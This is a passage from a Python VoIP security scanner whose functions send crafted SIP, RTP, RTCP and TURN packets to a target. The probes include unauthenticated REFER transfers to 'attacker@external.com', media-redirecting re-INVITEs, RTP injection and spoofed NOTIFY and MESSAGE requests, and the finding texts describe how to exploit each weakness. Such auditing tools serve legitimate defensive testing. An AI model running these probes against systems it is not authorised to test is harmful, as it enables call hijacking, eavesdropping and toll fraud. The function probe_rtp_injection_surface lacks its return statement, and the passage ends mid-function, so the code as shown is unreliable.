                f'de-registration accepted: any network-adjacent attacker can '
                f'remove any extension\'s binding from the location service, '
                f'causing all inbound calls to that extension to fail '
                f'(availability attack; complements registration hijack — '
                f'de-register then re-register to attacker-controlled Contact).'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# UC eavesdrop / interception / RTP-injection standalone probes
# Synthesized from:
#   Hacking Exposed UC VoIP — Ch10 (UC Network Eavesdropping)
#   Hacking Exposed UC VoIP — Ch11 (UC Interception and Modification)
# ---------------------------------------------------------------------------


def detect_voip_eavesdrop_surface(host: str, port: int = 5060,
                                   timeout: float = 5.0) -> list:
    """
    UC network eavesdropping attack surface (ch10/ch11).

    Three probes:
      1. SRTP enforcement — INVITE with SDP offering RTP/AVP only (no
         a=fingerprint, no SRTP).  If the server returns 200 OK with SDP
         that contains an a= attribute line but no a=fingerprint, call
         media will flow as cleartext RTP — eavesdroppable by any node on
         the path (ch10: call eavesdropping via Wireshark/UCSniff once
         network access is obtained; ch11: MITM sees cleartext stream).
      2. RTCP port exposure — UDP/5005 (default RTCP port offset from RTP
         5004).  Sends a minimal RTCP Sender Report (v=2, type=200,
         length=6, SSRC=0).  If no ICMP unreachable is returned within
         timeout, the RTCP port accepts traffic.  An open RTCP port leaks
         synchronization and timing metadata for active sessions (ch10:
         passive call-pattern tracking from SR timestamps and SSRC values).
      3. TURN ChannelBind without auth — sends a TURN ChannelBind request
         (type=0x0009) to UDP/3478 with no MESSAGE-INTEGRITY attribute.
         A non-error response indicates the TURN relay does not enforce
         long-term credential auth on ChannelBind, enabling unauthenticated
         relay channel setup (ch11: rogue SIP B2BUA via relay insertion;
         ch10: media-path interception via relay).

    Returns list of {severity, title, detail, host, port}.
    """
    import struct as _struct

    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: SRTP not required — INVITE with RTP/AVP, no fingerprint
    # ------------------------------------------------------------------
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    rtp_port_local = random.randint(49152, 65000)
    sdp = (
        'v=0\r\n'
        f'o=eavesdrop 0 0 IN IP4 {local_ip}\r\n'
        's=s\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio {rtp_port_local} RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
        'a=sendrecv\r\n'
    )
    sdp_len = len(sdp.encode('utf-8'))
    invite_msg = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:eavesdrop@{local_ip}>;tag={from_tag}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:eavesdrop@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len}',
        '',
        sdp,
    ])
    resp = _send_udp_sip(host, port, invite_msg, timeout)
    code = _parse_status_code(resp)
    if code == 200:
        has_a_line = bool(re.search(r'^a=', resp, re.MULTILINE))
        has_fingerprint = bool(re.search(r'^a=fingerprint', resp,
                                         re.MULTILINE | re.IGNORECASE))
        if has_a_line and not has_fingerprint:
            sdp_info = parse_sdp_media(resp)
            detail = (
                'Server returned 200 OK to INVITE offering RTP/AVP with no '
                'a=fingerprint or a=crypto in SDP answer. SRTP is NOT required '
                '— call media flows as cleartext RTP. Any network-adjacent '
                'attacker with access to the media path can capture and decode '
                'audio (ch10: Wireshark/UCSniff G.711 stream reconstruction; '
                'ch11: MITM relay sees plaintext RTP).'
            )
            if sdp_info.get('media_ip') and sdp_info.get('media_port'):
                detail += (
                    f' SDP answer: media={sdp_info["media_ip"]}:'
                    f'{sdp_info["media_port"]}'
                    f' profile={sdp_info.get("profile", "unknown")}.'
                )
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SRTP_NOT_REQUIRED — call media in cleartext',
                'detail': detail,
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 2: RTCP port exposure — UDP/5005 RTCP Sender Report
    # ------------------------------------------------------------------
    rtcp_port = 5005
    # Minimal RTCP SR (RFC 3550): V=2,P=0,RC=0,PT=200,length=6,SSRC=0
    # followed by NTP(8)+RTP TS(4)+pkt cnt(4)+octet cnt(4) = 20 bytes
    rtcp_sr = (
        b'\x80'              # V=2, P=0, RC=0
        b'\xc8'              # PT=200 (SR)
        b'\x00\x06'          # length=6 (7 32-bit words, minus 1)
        b'\x00\x00\x00\x00'  # SSRC=0
        b'\x00' * 20         # NTP(8)+RTP TS(4)+pkt cnt(4)+octet cnt(4)
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(rtcp_sr, (host, rtcp_port))
        try:
            data, _ = sock.recvfrom(2048)
            findings.append({
                'severity': 'MEDIUM',
                'title': 'RTCP_PORT_ACCESSIBLE',
                'detail': (
                    f'UDP {host}:{rtcp_port} responded to RTCP Sender Report '
                    f'({len(data)} bytes). RTCP port accessible to unauthenticated '
                    f'probes. Leaks session SSRC values, NTP timestamps, and '
                    f'packet/octet counts for active RTP sessions — enables '
                    f'passive call-pattern tracking and stream correlation without '
                    f'decrypting media (ch10: number harvesting and call pattern '
                    f'tracking via RTCP SR/RR metadata).'
                ),
                'host': host,
                'port': rtcp_port,
            })
        except socket.timeout:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'RTCP_PORT_ACCESSIBLE',
                'detail': (
                    f'UDP {host}:{rtcp_port} did not return ICMP unreachable to '
                    f'RTCP SR probe (port open or filtered). RTCP surface reachable; '
                    f'verify with active call capture to confirm SR/RR metadata '
                    f'exposure (ch10: call pattern tracking via RTCP).'
                ),
                'host': host,
                'port': rtcp_port,
            })
        sock.close()
    except OSError:
        pass

    # ------------------------------------------------------------------
    # Probe 3: TURN ChannelBind without auth credentials (RFC 5766)
    # ------------------------------------------------------------------
    turn_port = 3478
    tx_id = bytes(random.randint(0, 255) for _ in range(12))
    turn_channelbind = _struct.pack('>HHI', 0x0009, 0x0000, 0x2112A442) + tx_id
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(turn_channelbind, (host, turn_port))
        try:
            data, _ = sock.recvfrom(2048)
            if len(data) >= 4:
                resp_type = _struct.unpack_from('>H', data, 0)[0]
                if resp_type == 0x0109:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'TURN_UNAUTH_CHANNELBIND',
                        'detail': (
                            f'UDP {host}:{turn_port} returned TURN ChannelBind '
                            f'Success (0x0109) to a request with no '
                            f'MESSAGE-INTEGRITY or long-term credentials. '
                            f'TURN relay accepts ChannelBind without auth '
                            f'(RFC 5766 §11.2 auth requirement bypassed). '
                            f'Attacker can bind relay channels and pivot UDP '
                            f'through the server for media interception '
                            f'(ch11: rogue B2BUA insertion via relay; ch10: '
                            f'media path interception via TURN relay).'
                        ),
                        'host': host,
                        'port': turn_port,
                    })
                elif resp_type != 0x0119:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'TURN_RESPONDS_TO_UNAUTH_CHANNELBIND',
                        'detail': (
                            f'UDP {host}:{turn_port} returned unexpected type '
                            f'0x{resp_type:04x} to unauthenticated TURN '
                            f'ChannelBind. TURN service processing unauthenticated '
                            f'control messages; verify auth enforcement '
                            f'(ch11: TURN relay as media interception primitive).'
                        ),
                        'host': host,
                        'port': turn_port,
                    })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass

    return findings


def detect_sip_interception_indicators(host: str, port: int = 5060,
                                        timeout: float = 5.0) -> list:
    """
    Active interception attack surface detection (ch11).

    Four probes derived from ch11 application-level interception techniques
    (rogue SIP B2BUA, rogue SIP proxy, registration hijacking, call transfer):

      1. SIP REFER without auth (blind transfer) — REFER with Refer-To pointing
         to an external destination.  202 Accepted = server transfers dialog to
         arbitrary destination without authenticating the requestor (ch11: rogue
         proxy randomly redirecting calls; RFC 3515 REFER auth absent).
      2. SIP UPDATE without auth — UPDATE to a non-existing dialog (fabricated
         To-tag).  Any code other than 481/401/403/400 = UPDATE processed without
         dialog state validation; attacker can modify active-call media parameters
         (ch11: rogue B2BUA negotiating cleartext to strip SRTP; RFC 3311).
      3. PRACK to non-existing dialog — PRACK (RFC 3262) to a fabricated dialog.
         If the response includes Contact or Record-Route headers, server routing
         topology is disclosed to unauthenticated requests (ch11: topology
         discovery for targeted MITM insertion; RFC 3262 §4 dialog matching).
      4. re-INVITE with changed c= (media redirect) — re-INVITE with a different
         c= connection address and fabricated To-tag.  200 OK = SDP re-negotiation
         without dialog state validation; attacker can redirect media mid-call
         (ch11: audio replacement via rogue B2BUA; RFC 3261 §14.1).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: SIP REFER without auth — blind call transfer
    # ------------------------------------------------------------------
    br = _branch()
    cid = _call_id(host)
    from_tag = _tag()
    to_tag = _tag()
    refer_msg = '\r\n'.join([
        f'REFER sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br}',
        'Max-Forwards: 70',
        f'From: <sip:attacker@{local_ip}>;tag={from_tag}',
        f'To: <sip:100@{host}>;tag={to_tag}',
        f'Call-ID: {cid}',
        'CSeq: 1 REFER',
        f'Contact: <sip:attacker@{local_ip}:5060>',
        'Refer-To: <sip:attacker@external.com>',
        'Referred-By: <sip:attacker@external.com>',
        'Content-Length: 0',
        '',
        '',
    ])
    resp = _send_udp_sip(host, port, refer_msg, timeout)
    code = _parse_status_code(resp)
    if code == 202:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_BLIND_TRANSFER_UNAUTH',
            'detail': (
                f'Server {host}:{port} returned 202 Accepted to REFER with '
                f'Refer-To: sip:attacker@external.com and no Authorization '
                f'header. Server will transfer the dialog to an arbitrary '
                f'external destination without authenticating the requestor. '
                f'Enables call hijacking, toll fraud via external transfer, '
                f'and interception by redirecting calls to a rogue SIP B2BUA '
                f'(ch11: rogue proxy randomly redirecting calls; RFC 3515 '
                f'REFER auth requirement absent).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: SIP UPDATE without auth — media parameter modification
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    from_tag2 = _tag()
    to_tag2 = _tag()
    rtp_port2 = random.randint(49152, 65000)
    sdp2 = (
        'v=0\r\n'
        f'o=intercept 0 1 IN IP4 {local_ip}\r\n'
        's=s\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio {rtp_port2} RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
    )
    sdp_len2 = len(sdp2.encode('utf-8'))
    update_msg = '\r\n'.join([
        f'UPDATE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:attacker@{local_ip}>;tag={from_tag2}',
        f'To: <sip:100@{host}>;tag={to_tag2}',
        f'Call-ID: {cid2}',
        'CSeq: 1 UPDATE',
        f'Contact: <sip:attacker@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len2}',
        '',
        sdp2,
    ])
    resp2 = _send_udp_sip(host, port, update_msg, timeout)
    code2 = _parse_status_code(resp2)
    if code2 not in (0, 481, 401, 403, 400):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_UPDATE_ACCEPTED_UNAUTH',
            'detail': (
                f'Server {host}:{port} returned {code2} to UPDATE with a '
                f'fabricated To-tag (no matching dialog) and no auth. '
                f'Expected 481 (no dialog) or 401 (auth required); server '
                f'processed the UPDATE. Attacker can modify SDP media '
                f'parameters (codec, IP, port) of active calls without '
                f'authentication, enabling media redirection to a capture '
                f'endpoint (ch11: rogue B2BUA negotiating cleartext media; '
                f'RFC 3311 UPDATE dialog state validation absent).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: PRACK to non-existing dialog — session info leakage
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    from_tag3 = _tag()
    to_tag3 = _tag()
    prack_msg = '\r\n'.join([
        f'PRACK sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={from_tag3}',
        f'To: <sip:100@{host}>;tag={to_tag3}',
        f'Call-ID: {cid3}',
        'CSeq: 1 PRACK',
        'RAck: 1 1 INVITE',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, prack_msg, timeout)
    code3 = _parse_status_code(resp3)
    if code3 not in (0, 481, 404, 400, 501):
        has_contact = bool(re.search(r'^Contact\s*:', resp3,
                                     re.IGNORECASE | re.MULTILINE))
        has_record_route = bool(re.search(r'^Record-Route\s*:', resp3,
                                           re.IGNORECASE | re.MULTILINE))
        if has_contact or has_record_route:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'PRACK_SESSION_INFO_LEAKED',
                'detail': (
                    f'Server {host}:{port} returned {code3} to PRACK for a '
                    f'non-existing dialog and included Contact or Record-Route '
                    f'headers disclosing internal routing topology. PRACK to '
                    f'a fabricated dialog should return 481; server reveals '
                    f'session infrastructure (proxies, B2BUAs, media servers) '
                    f'useful for targeted MITM insertion (ch11: application-level '
                    f'interception topology discovery; RFC 3262 §4 dialog '
                    f'matching absent).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 4: re-INVITE with changed c= — media redirection check
    # ------------------------------------------------------------------
    br4 = _branch()
    cid4 = _call_id(host)
    from_tag4 = _tag()
    to_tag4 = _tag()
    rtp_port4 = random.randint(49152, 65000)
    sdp4 = (
        'v=0\r\n'
        f'o=reinvite 0 2 IN IP4 {local_ip}\r\n'
        's=s\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio {rtp_port4} RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
        'a=sendrecv\r\n'
    )
    sdp_len4 = len(sdp4.encode('utf-8'))
    reinvite_msg = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br4}',
        'Max-Forwards: 70',
        f'From: <sip:attacker@{local_ip}>;tag={from_tag4}',
        f'To: <sip:100@{host}>;tag={to_tag4}',
        f'Call-ID: {cid4}',
        'CSeq: 2 INVITE',
        f'Contact: <sip:attacker@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len4}',
        '',
        sdp4,
    ])
    resp4 = _send_udp_sip(host, port, reinvite_msg, timeout)
    code4 = _parse_status_code(resp4)
    if code4 == 200:
        sdp_info4 = parse_sdp_media(resp4)
        findings.append({
            'severity': 'MEDIUM',
            'title': 'REINVITE_MEDIA_REDIRECT_POSSIBLE',
            'detail': (
                f'Server {host}:{port} returned 200 OK to re-INVITE (CSeq: 2) '
                f'with a changed c= connection address and fabricated To-tag '
                f'(no matching dialog). Server accepted SDP re-negotiation '
                f'without dialog state validation. Attacker can redirect media '
                f'to a capture endpoint mid-call by sending a re-INVITE with '
                f'c= set to the attacker\'s RTP listener (ch11: audio '
                f'replacement/mixing via rogue B2BUA; RFC 3261 §14.1 '
                f're-INVITE dialog validation absent).'
                + (f' SDP answer: media={sdp_info4.get("media_ip", "?")}:'
                   f'{sdp_info4.get("media_port", "?")}.'
                   if sdp_info4.get('media_ip') else '')
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_rtp_injection_surface(host: str, rtp_port: int = 8000,
                                 timeout: float = 3.0) -> list:
    """
    RTP media stream injection surface probes (ch10/ch11).

    Three probes targeting RTP/SRTP injection vectors:

      1. RTP port injection test — sends a crafted RTP packet (v=2, CC=0,
         PT=0 PCMU, seq=0, SSRC=0xDEADBEEF) to the candidate RTP port.
         If no ICMP unreachable is returned within timeout, the port accepts
         arbitrary RTP traffic and an attacker can inject G.711 packets into
         an active stream (ch11: audio insertion via rogue B2BUA; ch10:
         cleartext RTP stream manipulation).
      2. SRTP downgrade probe — sends a plain RTP/AVP packet (no SRTP master
         key or MKI) to UDP/5004 (default SRTP port per RFC 3551).  If the
         port accepts the packet without ICMP reject, the endpoint may allow
         unauthenticated injection into supposed-secure streams (ch11: rogue
         B2BUA negotiating cleartext; RFC 3711 §3.4 auth tag not enforced).
      3. RTP sequence number boundary — sends RTP with seq=65535 and
         timestamp=0xFFFFFFFF.  If the port responds, the endpoint processes
         extreme boundary values without discarding; combined with a flood at
         seq=0 this can de-synchronize jitter buffers (ch10: stream disruption;
         RFC 3550 §5.1 sequence validation absent).

    Returns list of {severity, title, detail, host, port}.
    """
    import struct

    findings: list = []

    # ------------------------------------------------------------------
    # Probe 1: RTP injection — crafted packet to candidate RTP port
    # ------------------------------------------------------------------
    rtp_pkt = struct.pack('>BBHII',
                          0x80,       # V=2, P=0, X=0, CC=0
                          0x00,       # M=0, PT=0 (PCMU)
                          0,          # sequence number = 0
                          0,          # timestamp = 0
                          0xDEADBEEF  # SSRC
                          ) + b'\x7f' * 160  # 20ms PCMU silence
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(rtp_pkt, (host, rtp_port))
        try:
            data, _ = sock.recvfrom(2048)
            findings.append({
                'severity': 'MEDIUM',
                'title': 'RTP_PORT_ACCEPTS_INJECTION',
                'detail': (
                    f'UDP {host}:{rtp_port} responded ({len(data)} bytes) to '
                    f'crafted RTP packet (SSRC=0xDEADBEEF, PT=0 PCMU). Port '
                    f'actively processes injected RTP; attacker on the media path '
                    f'can insert audio frames into an active call stream. '
                    f'Combine with ARP poisoning for path insertion '
                    f'(ch11: audio insertion via rogue B2BUA; ch10: RTP stream '
                    f'manipulation once network access is obtained).'
                ),
                'host': host,
                'port': rtp_port,
            })
        except socket.timeout:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'RTP_PORT_ACCEPTS_INJECTION',
                'detail': (
                    f'UDP {host}:{rtp_port} did not return ICMP unreachable to '
                    f'crafted RTP packet (SSRC=0xDEADBEEF). Port open or filtered; '
                    f'RTP injection surface present. Verify with active call capture '
                    f'(ch11: audio mixing attack; ch10: stream interception).'
                ),
                'host': host,
                'port': rtp_port,
            })
        sock.close()
    except OSError:
        pass

    # ------------------------------------------------------------------
    # Probe 2: SRTP downgrade — plain RTP to UDP/5004 (SRTP default port)
    # ------------------------------------------------------------------
    srtp_port = 5004
    rtp_plain = struct.pack('>BBHII',
                            0x80,       # V=2, P=0, X=0, CC=0
                            0x00,       # M=0, PT=0 (PCMU)
                            1,          # sequence number = 1
                            160,        # timestamp = 160 (20ms)
                            0xCAFEBABE  # SSRC
                            ) + b'\x7f' * 160
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(rtp_plain, (host, srtp_port))
        try:
            data, _ = sock.recvfrom(2048)
            findings.append({
                'severity': 'HIGH',
                'title': 'SRTP_DOWNGRADE_ACCEPTED',
                'detail': (
                    f'UDP {host}:{srtp_port} responded ({len(data)} bytes) to '
                    f'a plain RTP/AVP packet (no SRTP master key, no MKI, no '
                    f'auth tag) sent to the default SRTP port. Endpoint processed '
                    f'unauthenticated non-SRTP traffic on the SRTP port — SRTP '
                    f'auth tag validation absent or cleartext downgrade accepted. '
                    f'Attacker can inject unauthenticated RTP into SRTP sessions '
                    f'(ch11: SRTP downgrade via rogue B2BUA SDP re-negotiation; '
                    f'RFC 3711 §3.4 auth tag requirement not enforced).'
                ),
                'host': host,
                'port': srtp_port,
            })
        except socket.timeout:
            findings.append({
                'severity': 'HIGH',
                'title': 'SRTP_DOWNGRADE_ACCEPTED',
                'detail': (
                    f'UDP {host}:{srtp_port} did not reject plain RTP/AVP '
                    f'packet (no ICMP unreachable). SRTP port open/filtered '
                    f'and silently processing unauthenticated RTP — possible '
                    f'SRTP downgrade surface. Verify during active call '
                    f'(ch11: cleartext media insertion; RFC 3711 auth absent).'
                ),
                'host': host,
                'port': srtp_port,
            })
        sock.close()
    except OSError:
        pass

    # ------------------------------------------------------------------
    # Probe 3: RTP sequence number validation — seq=65535 boundary
    # ------------------------------------------------------------------
    rtp_maxseq = struct.pack('>BBHII',
                             0x80,        # V=2, P=0, X=0, CC=0
                             0x00,        # M=0, PT=0 (PCMU)
                             65535,       # sequence number = max uint16
                             0xFFFFFFFF,  # timestamp = max uint32
                             0x00000001   # SSRC=1
                             ) + b'\x7f' * 160
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(rtp_maxseq, (host, rtp_port))
        try:
            data, _ = sock.recvfrom(2048)
            findings.append({
                'severity': 'LOW',
                'title': 'RTP_NO_SEQUENCE_VALIDATION',
                'detail': (
                    f'UDP {host}:{rtp_port} responded ({len(data)} bytes) to '
                    f'RTP with seq=65535 (max uint16) and timestamp=0xFFFFFFFF. '
                    f'Endpoint processes extreme boundary sequence numbers. '
                    f'Combined with a flood at seq=0 (wrap from 65535), this '
                    f'can de-synchronize jitter buffers and corrupt active call '
                    f'audio (ch10: RTP stream disruption; RFC 3550 §5.1 '
                    f'sequence number validation not enforced).'
                ),
                'host': host,
                'port': rtp_port,
            })
        except socket.timeout:
            pass
        sock.close()
    except OSError:
        pass


# ---------------------------------------------------------------------------
# detect_sip_signaling_manipulation
# ---------------------------------------------------------------------------

def detect_sip_signaling_manipulation(host: str, port: int = 5060,
                                      timeout: float = 5.0) -> list:
    """
    SIP signaling injection attack surface (ch15: signaling manipulation).

    Probes:
      1. SIP MESSAGE injection    — unauthenticated IM to arbitrary extension
      2. SIP CANCEL broadcast     — spurious CANCEL to non-existent Call-ID
      3. SIP NOTIFY injection     — Event: message-summary forwarding/acceptance
      4. Max-Forwards: 0          — RFC 3261 §8.2.2 enforcement (must return 483)
    """
    findings = []
    local_ip = _get_local_ip()

    def _send_recv(msg: str) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(msg.encode(), (host, port))
            try:
                data, _ = sock.recvfrom(4096)
                return data.decode(errors='replace')
            except socket.timeout:
                return ''
            finally:
                sock.close()
        except OSError:
            return ''

    # ------------------------------------------------------------------
    # Probe 1: SIP MESSAGE injection — send IM without authentication
    # ------------------------------------------------------------------
    br1 = _branch()
    tag1 = _tag()
    cid1 = _call_id(host)
    msg_body = 'Hello from ablation probe'
    msg_message = (
        f'MESSAGE sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}\r\n'
        f'From: <sip:100@{host}>;tag={tag1}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid1}\r\n'
        f'CSeq: 1 MESSAGE\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: text/plain\r\n'
        f'Content-Length: {len(msg_body)}\r\n'
        f'\r\n'
        f'{msg_body}'
    )
    resp1 = _send_recv(msg_message)
    first_line1 = resp1.split('\r\n', 1)[0] if resp1 else ''
    if resp1 and ' 200 ' in first_line1:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_MESSAGE_INJECTION',
            'detail': (
                f'UDP {host}:{port} returned 200 OK to an unauthenticated '
                f'SIP MESSAGE from ext 100 to ext 200 with no credentials. '
                f'Attacker can send arbitrary instant messages to any endpoint '
                f'on this PBX without registration or auth challenge '
                f'(ch15: signaling injection — spoofed MESSAGE delivery).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: SIP CANCEL to non-existent Call-ID — broadcast check
    # ------------------------------------------------------------------
    br2 = _branch()
    tag2 = _tag()
    cid2 = _call_id(host)
    msg_cancel = (
        f'CANCEL sip:100@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}\r\n'
        f'From: <sip:attacker@{local_ip}>;tag={tag2}\r\n'
        f'To: <sip:100@{host}>\r\n'
        f'Call-ID: {cid2}\r\n'
        f'CSeq: 1 CANCEL\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    )
    resp2 = _send_recv(msg_cancel)
    first_line2 = resp2.split('\r\n', 1)[0] if resp2 else ''
    if resp2 and ' 481 ' not in first_line2 and ' 200 ' in first_line2:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_CANCEL_BROADCAST',
            'detail': (
                f'UDP {host}:{port} returned 200 OK to CANCEL for non-existent '
                f'Call-ID {cid2!r}. Server did not return 481 as required by '
                f'RFC 3261 §9.2. May indicate the server broadcast the CANCEL '
                f'or accepted it without verifying dialog state — potential '
                f'call-teardown injection surface (ch15: mid-call CANCEL injection).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: SIP NOTIFY injection — Event: message-summary
    # ------------------------------------------------------------------
    br3 = _branch()
    tag3 = _tag()
    cid3 = _call_id(host)
    notify_body = (
        'Messages-Waiting: yes\r\n'
        'Message-Account: sip:200@' + host + '\r\n'
        'Voice-Message: 99/0 (0/0)\r\n'
    )
    msg_notify = (
        f'NOTIFY sip:200@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}\r\n'
        f'From: <sip:mwi@{local_ip}>;tag={tag3}\r\n'
        f'To: <sip:200@{host}>\r\n'
        f'Call-ID: {cid3}\r\n'
        f'CSeq: 1 NOTIFY\r\n'
        f'Event: message-summary\r\n'
        f'Subscription-State: active\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/simple-message-summary\r\n'
        f'Content-Length: {len(notify_body)}\r\n'
        f'\r\n'
        f'{notify_body}'
    )
    resp3 = _send_recv(msg_notify)
    first_line3 = resp3.split('\r\n', 1)[0] if resp3 else ''
    if resp3 and (' 200 ' in first_line3 or ' 202 ' in first_line3):
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_NOTIFY_INJECTION',
            'detail': (
                f'UDP {host}:{port} accepted unauthenticated NOTIFY with '
                f'Event: message-summary (status: {first_line3.strip()!r}). '
                f'Attacker can spoof MWI (message-waiting indicator) notifications '
                f'to arbitrary extensions — social engineering / voicemail '
                f'spoofing surface (ch15: NOTIFY injection without dialog '
                f'subscription check; RFC 3265 §3.2 subscription state not '
                f'verified).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 4: Max-Forwards: 0 — RFC 3261 §8.2.2 must return 483
    # ------------------------------------------------------------------
    br4 = _branch()
    tag4 = _tag()
    cid4 = _call_id(host)
    msg_mf0 = (
        f'OPTIONS sip:{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br4}\r\n'
        f'From: <sip:probe@{local_ip}>;tag={tag4}\r\n'
        f'To: <sip:{host}>\r\n'
        f'Call-ID: {cid4}\r\n'
        f'CSeq: 1 OPTIONS\r\n'
        f'Max-Forwards: 0\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    )
    resp4 = _send_recv(msg_mf0)
    first_line4 = resp4.split('\r\n', 1)[0] if resp4 else ''
    if resp4 and ' 483 ' not in first_line4 and ' 200 ' in first_line4:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_MAX_FORWARDS_NOT_ENFORCED',
            'detail': (
                f'UDP {host}:{port} returned {first_line4.strip()!r} to SIP '
                f'OPTIONS with Max-Forwards: 0. RFC 3261 §8.2.2 requires 483 '
                f'Too Many Hops. Non-enforcement allows infinite loop routing '
                f'and can be exploited to bypass hop-limit controls in proxy '
                f'chains (ch15: routing manipulation via Max-Forwards abuse).'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# detect_dtmf_extraction_surface
# ---------------------------------------------------------------------------

def detect_dtmf_extraction_surface(host: str, port: int = 5060,
                                   timeout: float = 5.0) -> list:
    """
    DTMF digit exfiltration attack surface (ch16: audio manipulation).

    Probes:
      1. SIP INFO + dtmf-relay body   — server accepts DTMF delivery via INFO
      2. NOTIFY telephone-event        — out-of-dialog NOTIFY accepted
      3. SDP INVITE with RFC 2833 PT   — server negotiates telephone-event PT=101
    """
    findings = []
    local_ip = _get_local_ip()

    def _send_recv_udp(msg: str) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(msg.encode(), (host, port))
            try:
                data, _ = sock.recvfrom(4096)
                return data.decode(errors='replace')
            except socket.timeout:
                return ''
            finally:
                sock.close()
        except OSError:
            return ''

    # ------------------------------------------------------------------
    # Probe 1: SIP INFO with Content-Type: application/dtmf-relay
    # ------------------------------------------------------------------
    br1 = _branch()
    tag1 = _tag()
    cid1 = _call_id(host)
    dtmf_body = 'Signal=5\r\nDuration=250\r\n'
    msg_info = (
        f'INFO sip:100@{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}\r\n'
        f'From: <sip:attacker@{local_ip}>;tag={tag1}\r\n'
        f'To: <sip:100@{host}>\r\n'
        f'Call-ID: {cid1}\r\n'
        f'CSeq: 1 INFO\r\n'
        f'Max-Forwards: 70\r\n'
        f'Content-Type: application/dtmf-relay\r\n'
        f'Content-Length: {len(dtmf_body)}\r\n'
        f'\r\n'
        f'{dtmf_body}'
    )
    resp1 = _send_recv_udp(msg_info)
    first_line1 = resp1.split('\r\n', 1)[0] if resp1 else ''
